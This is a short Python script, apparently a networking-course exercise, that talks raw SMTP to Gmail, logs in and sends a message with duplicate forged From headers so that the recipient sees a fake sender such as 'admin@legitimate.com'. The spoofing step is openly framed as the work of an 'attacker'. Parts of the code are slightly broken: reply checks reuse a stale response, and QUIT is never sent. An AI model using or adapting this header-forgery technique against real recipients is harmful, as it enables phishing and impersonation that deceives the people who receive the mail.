import smtplib
from socket import *
import base64
import ssl


def print_receiving_msg(recv, request, exp_code):
    print("Message after " + request + " request: " + recv)
    if (recv[0:3] != exp_code):
        print(exp_code + ' reply not received from server.')


sender_email = ""
receiver_email = ""
receiving_mail_server = ('smtp.gmail.com', 587); 
password = ""
message = "test"



# Create socket called clientSocket and establish a TCP connection with mailserver
clientSocket = socket(AF_INET, SOCK_STREAM)
print("Connecting to mail server")
clientSocket.connect(receiving_mail_server)

#Read at most 1024 bytes from server
recv = clientSocket.recv(1024).decode();
print_receiving_msg(recv, "connection", "220")

# Send HELO command and print server response.
heloCommand = b'EHLO NOTREALDOMAIN\r\n'
clientSocket.send(heloCommand)
recv = clientSocket.recv(1024).decode()
print_receiving_msg(recv, "EHLO", "250")


#gmail needs to use TLS to start connection
clientSocket.send(b'STARTTLS\r\n')
recv = clientSocket.recv(1024).decode()
print_receiving_msg(recv, "STARTTLS", "220")

tlsSocket = ssl.wrap_socket(clientSocket, ssl_version=ssl.PROTOCOL_TLS)


#Login for attacker, not needed when we have email server
auth_msg = b'AUTH PLAIN '+base64.b64encode(b'\x00'+ sender_email.encode() +b'\x00'+password.encode())+b'\r\n'
tlsSocket.send(auth_msg)
print(auth_msg.decode())
recv = tlsSocket.recv(1024).decode()
print_receiving_msg(recv, "Authentication", "235")


#SMTP MAIL FROM
MAIL_FROM = b'mail from: <'+sender_email.encode() +b'>\r\n'
tlsSocket.send(MAIL_FROM)
recv = tlsSocket.recv(1024).decode()
print_receiving_msg(recv, "mail from", "250")

#SMTP RCPT TO
RCPT_TO = b'rcpt to: <'+receiver_email.encode() +b'>\r\n'
tlsSocket.send(RCPT_TO)
recv = tlsSocket.recv(1024).decode()
print_receiving_msg(recv, "rcpt to", "250")

#DATA command
DATA = b'DATA\r\n'
tlsSocket.send(DATA)
recv = tlsSocket.recv(1024).decode()
print_receiving_msg(recv, "data", "354")

#Message shown to user on UI
fakefrom = "From: FAKE NAME <fake@fake.com>\r\nFrom: <admin@legitimate.com>\r\n"
tlsSocket.send(fakefrom.encode())
print_receiving_msg(recv, "fake", "354")
subject = "Subject: new  \r\n\r\n" 
tlsSocket.send(subject.encode())
print_receiving_msg(recv, "subject", "354")
msg = "\r\n I love Computer Networks"
endmsg = "\r\n.\r\n"
tlsSocket.send(message.encode())
print_receiving_msg(recv, "msg", "354")
tlsSocket.send(endmsg.encode())
print_receiving_msg(recv, "endmsg", "354")


#quit command
QUIT = b'quit\r\n'
recv=tlsSocket.recv(1024).decode()
print_receiving_msg(recv, "quit", "250")
tlsSocket.close()





#server = smtplib.SMTP('smtp.gmail.com', 587)
#server.starttls()
#server.login(sender_email, password)
#print("sending email")
#server.sendmail(sender_email, receiver_email, message)



